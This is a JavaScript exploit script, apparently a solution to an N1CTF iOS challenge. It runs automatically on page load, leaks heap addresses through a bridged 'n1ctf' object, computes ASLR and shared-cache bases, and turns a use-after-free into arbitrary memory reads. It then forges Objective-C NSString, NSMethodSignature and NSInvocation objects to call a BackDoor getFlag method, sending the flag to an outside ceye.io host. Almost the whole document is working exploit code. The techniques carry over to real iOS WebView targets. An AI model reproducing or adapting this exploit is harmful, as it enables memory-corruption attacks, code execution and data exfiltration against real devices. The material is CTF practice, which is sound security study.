const NSInvocationClass_offset = 0x1de53a658
const NSMethodSignatureClazz_offset = 0x1de53a5b8
const NSConcreteData_offset = 0x1de542370
const kCFBooleanFalse_offset = 0x1da63a0b8 // __kCFBooleanFalse
const NSCFStringClass_offset = 0x1de539b40

const BackDoorClass_offset = 0x100013120
const CoreServiceClass_offset = 0x100013238
const SEL_getFlag_offset = 0x10000d99B

// const url = "http://172.16.113.89:9001/"
const url = "http://7kj8dy.ceye.io/?c="

function LOG(info) {

    var bodyElement = document.body;
    var newText = document.createTextNode("[*] " + info);
    var br = document.createElement("br");
    bodyElement.appendChild(newText);
    bodyElement.appendChild(br);
} 

function hexToBytesAndReverse(hex) {
    var bytes = [];
    for (var i = hex.length - 2; i >= 0; i -= 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

function padding_hexstring(hexString, length) {
    while (hexString.length < length) {
      hexString = "0" + hexString;
    }
    return hexString;
}

function bytesToBase64(bytes) {
    var binary = '';
    for (var i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
}

function hexReverse(hex) {
    hex = hex.replace("0x", "").replace(" ", "")
    var reverse = "";
    for (var i = hex.length - 2; i >= 0; i -= 2) {
        reverse += hex.substr(i, 2)
    }
    return reverse;
}

function addrof(obj, restore) {

    var challenge = n1ctf.challenge();
    if(restore == 0) {
        window.challenge = challenge
    }
    n1ctf.setChallenge_(obj)
    try {
        n1ctf.challenge()
    } catch(e) {
        const match = /instance (0x[\da-f]+)$/i.exec(e)
        if (match) return match[1]
        throw new Error('Unable to leak heap addr')
    } finally {
        if(restore) {
            n1ctf.setChallenge_(challenge)
        }
    }
}

function make_object(classptr, size) {
    var obj = new Uint8Array(size);
    var isa = (BigInt(classptr) | BigInt(0x1) | BigInt(0x0100000000000000)).toString(16)
    var bytes = hexToBytesAndReverse(padding_hexstring(isa, 16))
    for (var i = 0; i < bytes.length; i++) {
        obj[i] = bytes[i]
    }
    return obj
}

function make_frame_descriptor(arraybuffer_pointer, offset, num_args, size) {

    num_args = num_args -1 

    var frame_descriptor = new Uint8Array(size);
    for(var i = num_args; i >= 0; i--) {
        var elem1 = hexToBytesAndReverse(padding_hexstring('0', 16))
        for(var j = 0; j < elem1.length; j++) {
            frame_descriptor[j + (Math.abs(i - 2)) * 0x28] = elem1[j]
        }
        if (i != 0) {
            var elem2 = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + offset + (Math.abs(i - 3)) * 0x28).toString(16), 16))
            for(var j = 0; j < elem2.length; j++) {
                frame_descriptor[j + 0x8 + (Math.abs(i - 2)) * 0x28] = elem2[j]
            }
        }
        var elem3 = hexToBytesAndReverse(padding_hexstring('8', 16))
        for(var j = 0; j < elem3.length; j++) {
            frame_descriptor[j + 0x10 + (Math.abs(i - 2)) * 0x28] = elem3[j]
        }
        var elem4 = hexToBytesAndReverse(padding_hexstring((BigInt(i * 8) << BigInt(32) | BigInt(0x8)).toString(16), 16))
        for(var j = 0; j < elem4.length; j++) {
            frame_descriptor[j + 0x18 + i * 0x28] = elem4[j]
        } 
    }
    var elem5 = hexToBytesAndReverse('0x0000404020000000'.slice(2))
    for(var i = 0; i < elem5.length; i++) {
        frame_descriptor[i + 0x20] = elem5[i]
    }
    var elem6 = hexToBytesAndReverse('0x00003a3a00000000'.slice(2))
    for(var i = 0; i < elem6.length; i++) {
        frame_descriptor[i + 0x20 + 0x28] = elem6[i]
    }
    var elem7 = hexToBytesAndReverse('0x0000404020000000'.slice(2))
    for(var i = 0; i < elem7.length; i++) {
        frame_descriptor[i + 0x20 + 0x28 * 2] = elem7[i]
    }
    var elem_ret = hexToBytesAndReverse('0x0000767600000000'.slice(2))
    for(var i = 0; i < elem_ret.length; i++) {
        frame_descriptor[i + 0x20 + 0x28 * 3] = elem_ret[i]
    }

    var ret_frame = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + offset + 0x28 * 3).toString(16), 16))
    for(var i = 0; i < ret_frame.length; i++) {
        frame_descriptor[0x28 * 4 +  0x0 + i] = ret_frame[i]
    }
    var arg_frame = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + offset).toString(16), 16))
    for(var i = 0; i < arg_frame.length; i++) {
        frame_descriptor[0x28 * 4 + 0x8 + i] = arg_frame[i]
    }
    var arg_len = hexToBytesAndReverse(padding_hexstring((0x000000e000000000 + num_args + 1).toString(16), 16))
    for(var i = 0; i < arg_len.length; i++) {
        frame_descriptor[0x28 * 4 + 0x10 + i] = arg_len[i]
    }

    return frame_descriptor
}


function make_method_signature(arraybuffer_pointer, offset, num_args, frame_descriptor_size) {

    var frame_descriptor = make_frame_descriptor(arraybuffer_pointer, offset, num_args, frame_descriptor_size)

    var method_signature = make_object(window.NSMethodSignatureClass, 0x20)

    // frame
    var frame_addr = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + offset + frame_descriptor_size - 0x18).toString(16), 16))
    for(var i = 0; i < frame_addr.length; i++) {
        method_signature[0x8 + i] = frame_addr[i]
    }
    // typestring
    var typestring = hexToBytesAndReverse(padding_hexstring('0', 16))
    for(var i = 0; i < typestring.length; i++) {
        method_signature[0x10 + i] = typestring[i]
    }
    // flag
    var flag_bytes = hexToBytesAndReverse(padding_hexstring('6', 16))
    for(var i = 0; i < flag_bytes.length; i++) {
        method_signature[0x18 + i] = flag_bytes[i]
    }
    return [frame_descriptor, method_signature]
}

function make_frame(string_addr) {

    var clz = hexToBytesAndReverse(padding_hexstring((window.BackDoorClass).toString(16), 16))
    var sel = hexToBytesAndReverse(padding_hexstring((window.SEL_getFlag).toString(16), 16))
    var frame = new Uint8Array(0x18);
    for(var i = 0; i < clz.length; i++) {
        frame[i] = clz[i]
    }
    for(var i = 0; i < sel.length; i++) {
        frame[0x8 + i] = sel[i]
    }
    for(var i = 0; i < string_addr.length; i++) {
        frame[0x10 + i] = string_addr[i]
    }
    return frame
}


function make_nsinvocation(arraybuffer_pointer, offset, num_args, string_addr) {
    
    var frame_descriptor_size = 0x28 * 4 + 0x18
    
    // [0x28 * 4 + 0x18, 0x20]
    var method_signature_arr = make_method_signature(arraybuffer_pointer, offset, num_args, frame_descriptor_size)
    offset = offset + frame_descriptor_size + 0x20

    // 0x18
    var frame = make_frame(string_addr)

    // 0x50
    var nsinvocation = make_object(window.NSInvocationClass, 0x50)

    var frame_addr = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + offset).toString(16), 16))
    for(var i = 0; i < frame_addr.length; i++) {
        nsinvocation[0x8 + i] = frame_addr[i]
    }
    var str_addr = hexToBytesAndReverse(padding_hexstring(((parseInt("0x" + arraybuffer_pointer)) + offset + 0x10).toString(16), 16))
    for(var i = 0; i < str_addr.length; i++) {
        nsinvocation[0x10 + i] = str_addr[i]
    }
    var sig_addr = hexToBytesAndReverse(padding_hexstring((parseInt("0x" + arraybuffer_pointer) + 0xf0).toString(16), 16)) 
    for(var i = 0; i < sig_addr.length; i++) {
        nsinvocation[0x18 + i] = sig_addr[i]
    }
    var clz = hexToBytesAndReverse(padding_hexstring((window.BackDoorClass).toString(16), 16))
    for(var i = 0; i < clz.length; i++) {
        nsinvocation[0x30 + i] = clz[i]
    }
    var sel = hexToBytesAndReverse(padding_hexstring((window.SEL_getFlag).toString(16), 16))
    for(var i = 0; i < sel.length; i++) {
        nsinvocation[0x38 + i] = sel[i]
    }
    var magic = hexToBytesAndReverse(padding_hexstring((window.magic).toString(16), 16))
    for(var i = 0; i < magic.length; i++) {
        nsinvocation[0x40 + i] = magic[i]
    }

    // [0x28 * 4 + 0x18, 0x20, 0x18, 0x50]
    return [method_signature_arr[0], method_signature_arr[1], frame, nsinvocation]
}

function make_nsdata(pointer, size) {

    var fake_size = 0xc0 // malloc_size(N1CTFIntroduction) = 0xc0
    var nsdata = make_object(window.NSConcreteDataClass, fake_size)
    var len = hexToBytesAndReverse(padding_hexstring(size.toString(16), 16))
    var pointer = hexToBytesAndReverse(padding_hexstring(pointer.replace("0x", ""), 16))
    var arr = [len, pointer]
    for(var i = 0; i < arr.length; i++) {
        for (var j = 0; j < arr[i].length; j++) {
            nsdata[8 + i * arr[i].length + j] = arr[i][j]
        }
    }
    return bytesToBase64(nsdata)
}

function make_nsstring(string) {

    var flags = '0x000000020000078c'

    var encoder = new TextEncoder();
    var bytes = encoder.encode(string);
    bytesArr = Array.from(bytes);
    bytesArr.splice(0, 0, bytesArr.length)
    var extra = (bytesArr.length) % 8
    if( extra > 0) {
        var len = 8 - extra
        for(var i = 0; i < len; i++) {
            bytesArr.push(0)
        }
    }
    var string = make_object(window.NSCFStringClass, 16 + bytesArr.length)

    // 添加 flag
    var flag_bytes = hexToBytesAndReverse(flags.slice(2))
    for (var i = 0; i < flag_bytes.length; i++) {
        string[0x8 + i] = flag_bytes[i]
    }
    // 添加字符串数据
    for (var i = 0; i < bytesArr.length; i++) {
        string[0x10 + i] = bytesArr[i]
    }
    return string
}


function make_coreservice(invocation) {

    console.log("invocation: " + invocation)
    var coreservice = make_object(window.CoreServiceClass, 0x30)
    var invocation_p = hexToBytesAndReverse(padding_hexstring(invocation, 16))
    console.log("invocation_p: " + invocation_p)

    for(var i = 0; i < invocation_p.length; i++) {
        coreservice[0x10 + i] = invocation_p[i]
    }
    // return bytesToBase64(coreservice)
    return coreservice
}


function arbitrary_read(addr, len) {

    var data = make_nsdata(addr, len)
    var req = n1ctf.makeHTTRequest()
    var ctf = n1ctf.makeN1CTFIntroduction()
    ctf.dealloc()
    // for (let i = 0; i < 32; i++)
    req.addMultiPartData_(data)
    return ctf
}

function pwn() {

    var false_offset = addrof(false, 1)
    const shared_cache_base = parseInt(false_offset) - kCFBooleanFalse_offset
    console.log("shared_cache_base: " + shared_cache_base.toString(16))
    LOG("shared_cache_base: 0x" + shared_cache_base.toString(16))

    window.NSConcreteDataClass = shared_cache_base + NSConcreteData_offset
    window.NSCFStringClass = shared_cache_base + NSCFStringClass_offset
    window.NSInvocationClass = shared_cache_base + NSInvocationClass_offset
    window.NSMethodSignatureClass = shared_cache_base + NSMethodSignatureClazz_offset

    var coreservice = n1ctf.makeCoreService()
    var coreservice_addr = addrof(coreservice, 1)
    // LOG("coreservice_addr: " + coreservice_addr)
    console.log("coreservice_addr: " + coreservice_addr)

    // 读取 CoreService isa
    var coreservice_memory = arbitrary_read(coreservice_addr, 0x18)
    console.log("coreservice_memory: " + coreservice_memory)
    // LOG("coreservice_memory: " + coreservice_memory)
    const match4 = /bytes = (0x[\da-f\s]{16})/.exec(coreservice_memory)
    if(!match4) {
        throw new Error("UAF Error")
        // return 
    }
    var coreservice_isa = hexReverse(match4[1])
    console.log("coreservice_isa: " + coreservice_isa)

    // 读取 magic
    var match5 = /[\d\D]{56}([\d\D]{16})/.exec(coreservice_memory);
    if(!match5) {
        throw new Error("UAF Error")
        // return 
    }
    var nsinvocation_pointer = hexReverse(match5[1].trim())
    // LOG("nsinvocation_pointer: " + nsinvocation_pointer)
    console.log("nsinvocation_pointer: " + nsinvocation_pointer)
    
    var nsinvocation_memory = arbitrary_read(nsinvocation_pointer, 0x48)
    console.log(nsinvocation_memory)
    // n1ctf.DEBUGLOG_(nsinvocation_memory)

    var match6 = /\.\.\.([\s\S]*?)\s*\}/.exec(nsinvocation_memory);
    if(!match6) {
        throw new Error("UAF Error")
        // return 
    }
    var magic = hexReverse(match6[1].trim())
    LOG("NSInvocation magic: 0x" + magic)
    console.log("magic: " + magic)

    window.CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)
    window.ASLR = parseInt("0x" + window.CoreServiceClass.toString(16)) - CoreServiceClass_offset
    window.BackDoorClass = window.ASLR + BackDoorClass_offset
    window.SEL_getFlag = window.ASLR + SEL_getFlag_offset

    window.magic = magic

    LOG("ASLR: 0x" + (window.ASLR).toString(16))
    console.log("CoreServiceClass_offset: 0x" + (window.CoreServiceClass).toString(16))
    console.log("CoreServiceClass_offset: 0x" + (CoreServiceClass_offset).toString(16))
    console.log("ASLR: 0x" + (window.ASLR).toString(16))

    size = 0x200
    var payload = new Uint8Array(size);
    for(var i = 0; i < size; i++) {
        payload[i] = 0x0
        // payload[i] = 0x41
    }
    // 读取 WebScriptObject 的内存
    var webscriptobject_pointer = addrof(payload, 0)
    var webscriptobject_memory = arbitrary_read(webscriptobject_pointer, 0x18)
    // LOG("webscriptobject_memory: " + webscriptobject_memory)

    var match1 = /[\d\D]{40}([\d\D]{16})/.exec(webscriptobject_memory);
    if(!match1) {
        throw new Error("UAF Error")
        // return 
    }
    var webscriptobjectprivate_pointer = hexReverse(match1[1])
    // console.log("webscriptobjectprivate_pointer: " + webscriptobjectprivate_pointer)
    // LOG("webscriptobjectprivate_pointer: " + webscriptobjectprivate_pointer)

    // 读取 WebScriptObjectPrivate 的内存
    var webscriptobjectprivate_memory = arbitrary_read(webscriptobjectprivate_pointer, 0x18)
    var match2 = /[\d\D]{40}([\d\D]{16})/.exec(webscriptobjectprivate_memory);
    if(!match2) {
        throw new Error("UAF Error")
        // return 
    }
    var jsobject_pointer = hexReverse(match2[1])
    console.log("jsobject_pointer: " + jsobject_pointer)
    // LOG("jsobject_pointer: " + jsobject_pointer)

    // 读取 JSObject 内存
    var jsobject_memory = arbitrary_read(jsobject_pointer, 0x18)
    var match3 = /[\d\D]{56}([\d\D]{16})/.exec(jsobject_memory);
    if(!match3) {
        throw new Error("UAF Error")
        // return 
    }
    var arraybuffer_pointer = hexReverse(match3[1])
    // console.log("arrayBuffer_pointer: " + arraybuffer_pointer)
    // LOG("arrayBuffer_pointer: " + arraybuffer_pointer)
    console.log("arrayBuffer_pointer: " + arraybuffer_pointer)
    LOG("arrayBuffer_pointer: " + arraybuffer_pointer)

    // 开始伪造需要的 NSInvocation
    offset = 0x0

    // 伪造字符串 长度 0x30
    var string = make_nsstring(url)
    for(var i = 0; i < string.length; i++) {
        payload[i] = string[i]
    }
    offset += 0x30

    // 写入字符串地址
    var string_addr = hexToBytesAndReverse(arraybuffer_pointer)
    for(var i = 0; i < string_addr.length; i++) {
        payload[offset + i] = string_addr[i]
    }
    offset += 0x8
    console.log("payload size: 0x" + offset.toString(16))

    var num_args = 3
    var invocation_arr = make_nsinvocation(arraybuffer_pointer, offset, num_args, string_addr)

    for(var i = 0; i < invocation_arr.length; i++) {

        for(var j = 0; j < invocation_arr[i].length; j ++) {

            payload[offset + j] = invocation_arr[i][j]
        }
        offset += invocation_arr[i].length
    }

    console.log("payload size: 0x" + offset.toString(16))

    n1ctf.setChallenge_(window.challenge)

    var ctf = n1ctf.makeN1CTFIntroduction()
    var ctf_addr = addrof(ctf, 1)

    var fake_coreservice = make_coreservice((parseInt(ctf_addr) + 0x30).toString(16))
    var fake_obj = new Uint8Array(0xc0);
    for(var i = 0; i < 0x30; i++) {
        fake_obj[i] = fake_coreservice[i];
    }
    for(var i = 0; i < invocation_arr[3].length; i++) {
        fake_obj[i + 0x30] = invocation_arr[3][i];
    }
    
    var req = n1ctf.makeHTTRequest()
    ctf.dealloc()
    req.addMultiPartData_(bytesToBase64(fake_obj))

    setTimeout(function() {
        LOG("Your device is pwned!");
        ctf.dealloc()
    }, 1000);

    /*
    var clz = ObjC.classes.BackDoor.class()
    var sig = clz.methodSignatureForSelector_(ObjC.selector('getFlag:'))
    var invoke = ObjC.classes.NSInvocation.invocationWithMethodSignature_(sig)
    invoke.setTarget_(ObjC.classes.BackDoor)
    invoke.setSelector_(ObjC.selector('getFlag:'))
    invoke
    */
}

document.addEventListener("DOMContentLoaded", function() {
    pwn()
});